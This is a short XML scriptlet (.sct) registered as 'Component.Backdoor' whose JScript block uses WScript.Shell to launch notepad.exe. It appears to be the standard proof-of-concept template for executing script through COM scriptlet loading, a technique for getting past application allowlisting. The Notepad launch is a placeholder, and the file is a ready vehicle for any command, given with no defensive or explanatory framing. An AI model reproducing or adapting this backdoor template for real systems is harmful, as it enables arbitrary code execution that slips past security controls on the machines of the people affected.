<?XML version="1.0"?>
<scriptlet>

<registration
    description="Component"
    progid="Component.Backdoor"
    version="1.00"
    classid="{10001111-0000-0000-0000-00000000ACDC}"
>
</registration>

<public>
    <method name="Exec">
    </method>
</public>
<script language="JScript">
<![CDATA[

	var r = new ActiveXObject("WScript.Shell").Exec("notepad.exe");
	
]]>
</script>

</scriptlet>
